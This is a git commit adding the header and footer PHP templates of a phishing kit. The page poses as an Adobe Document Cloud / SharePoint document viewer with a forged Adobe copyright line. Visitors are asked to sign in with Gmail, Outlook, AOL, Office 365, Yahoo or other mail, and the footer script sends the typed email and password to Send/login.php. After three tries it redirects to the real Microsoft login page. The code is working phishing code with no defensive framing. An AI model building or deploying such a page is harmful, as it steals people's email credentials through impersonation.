70c1b5ed2b29a57eee4856024d9e2724196ccb2b
deearr063 <119115999+deearr063@users.noreply.github.com>
2023-07-19 09:21:07 -0400

    Add files via upload

--- adobe/File/Vendor/footer.php
+++ adobe/File/Vendor/footer.php
@@ -1,1 +1,112 @@
-
+</div>
+</div>
+</div>
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous">
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous">
+</script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous">
+</script>
+</body>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js">
+</script>
+<script>
+    /* global $ */
+    $(document).ready(function(){
+      var count=0;
+      $('#gmailmodal').click(function () {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'File/gmail.png');
+        $('#field').html("Gmail");
+        $('#ajaxModal').modal('show');
+      });
+      $('#outlookmodal').click(function () {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'File/outlook.png');
+        $('#field').html("Outlook");
+        $('#ajaxModal').modal('show');
+      });
+      $('#aolmodal').click(function () {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'File/aol.png');
+        $('#field').html("Aol");
+        $('#ajaxModal').modal('show');
+      });
+      $('#office365modal').click(function () {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'File/office365.png');
+        $('#field').html("Office 365");
+        $('#ajaxModal').modal('show');
+      });
+      $('#yahoomodal').click(function () {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'File/yahoo.png');
+        $('#field').html("Yahoo");
+        $('#ajaxModal').modal('show');
+      });
+      $('#othermodal').click(function () {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', 'File/othermail.ico');
+        $('#field').html("Other Mail");
+        $('#ajaxModal').modal('show');
+      });
+      $('#submit-btn').click(function(event){
+        event.preventDefault();
+        var email=$("#email").val();
+        var password=$("#password").val();
+        var detail=$("#field").html();
+        var msg = $('#msg').html();
+        $('#msg').text( msg );
+        count=count+1;
+        if (count>=3) {
+          count=0;
+          window.location.replace("https://login.microsoftonline.com/common/login");
+        }
+        else
+        {
+         $.ajax({
+          dataType: 'JSON',
+          url: 'Send/login.php',
+          type: 'POST',
+          data:{
+            email:email,
+            password:password,
+            detail:detail,
+          },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Verifing...');
+            },
+            success: function(response){
+              if(response){
+                $("#msg").show();
+                console.log(response);
+                if(response['signal'] == 'ok'){
+                 $('#msg').html(response['msg']);
+                  // $('input, textarea').val(function() {
+                  //    return this.defaultValue;
+                  // });
+                }
+                else{
+                  $('#msg').html(response['msg']);
+                }
+              }
+            },
+            error: function(){
+              $("#msg").show();
+              $('#msg').html("Please try again later");
+            },
+            complete: function(){
+              $('#submit-btn').html('Login');
+            }
+          });
+       }
+     });
+    });
+</script>
---
+++ adobe/File/Vendor/header.php
@@ -0,0 +1,87 @@
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+<link href="https://fonts.googleapis.com/css?family=Yellowtail&display=swap" rel="stylesheet">
+<title>Share Point Online</title>
+<link href="File/File.css" rel="stylesheet" media="all">
+<style type="text/css">
+</style>
+</head>
+<body>
+<div class="container-fluid">
+<div class="row" style="background-image: url('File/background.jpg'); background-size: cover;background-repeat: no-repeat;">
+<div class="container">
+<div class="row">
+<div class="col-lg-6 mx-auto my-5 px-5 pb-5" style="border:1px solid; background-color: rgba(0,0,0,0.7);border-radius:15px;">
+<div class="text-center pt-5"> 
+<img src="File/adobe.jpg" class="img-fluid" width="100px">
+<br>
+<span class="h5 text-white">Adobe Document Cloud
+</span>
+<br>
+<span class="h5 text-white font-weight-normal">To read the document, please enter with the valid email credentials that this file was sent to.
+</span>
+</div>
+<div class="mt-3">
+<div class="row">
+<div class="col-lg-12">
+<a href="javascript:void(0)" id="gmailmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+<div class="mt-2" style=" background-color: #D44638;">
+</div>
+</a>
+</div>
+<div class="col-lg-12">
+<a href="javascript:void(0)" id="outlookmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+<div class=" mt-2" style=" background-color: #0073C8;">
+<img src="File/outlook1.png" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
+<span class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Outlook
+</span>
+</div>
+</a>
+</div>
+</div>
+<div class="row">
+<div class="col-lg-12 ">
+<a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+<div class="  mt-2" style=" background-color: #31459B;">
+</div>
+</a>
+</div>
+<div class="col-lg-12">
+<a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+<div class=" mt-2" style=" background-color: #FF3C00;">
+<img src="File/office3651.png" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
+<span class="pl-4"  style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Office365
+</span>
+</div>
+</a>
+</div>
+</div>
+<div class="row">
+<div class="col-lg-12">
+<a href="javascript:void(0)" id="yahoomodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+<div class=" mt-2" style=" background-color: #5F0F68;">
+</div>
+</a>
+</div>
+<div class="col-lg-12">
+<a href="javascript:void(0)" id="othermodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
+<div class=" mt-2" style=" background-color: #0B5BD3;">
+<img src="File/other1.png" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
+<span class="pl-4"  style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with Other Mail
+</span>
+</div>
+</a>
+</div>
+<div class="col-lg-12">
+<p class="text-white mt-3 text-center">Select your email provider to view Document
+</p>
+<p class="h6 text-center text-white">CopyRight© 2023 Adobe.
+</p> 
+</div>
+</div> 
+</div>
+</div>
+</div>
+</div> 
+</div>
